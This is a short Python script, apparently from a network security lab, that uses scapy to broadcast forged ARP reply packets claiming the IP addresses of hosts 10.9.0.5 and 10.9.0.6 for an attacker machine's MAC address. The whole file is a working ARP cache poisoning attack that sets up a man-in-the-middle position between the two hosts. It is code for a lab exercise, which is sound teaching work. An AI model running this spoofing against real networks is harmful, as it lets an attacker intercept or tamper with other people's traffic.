#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

BROADCAST = "ff:ff:ff:ff:ff:ff"

E = Ether(src=MAC_M, dst=BROADCAST)
A = ARP(psrc=IP_A, hwsrc=MAC_M, pdst=IP_A, hwdst=BROADCAST)
A.op = 2

pkt = E/A

E1 = Ether(src=MAC_M, dst=BROADCAST)
A1 = ARP(psrc=IP_B, hwsrc=MAC_M, pdst=IP_B, hwdst=BROADCAST)
A1.op = 2

pkt1 = E1/A1

sendp(pkt)
sendp(pkt1)
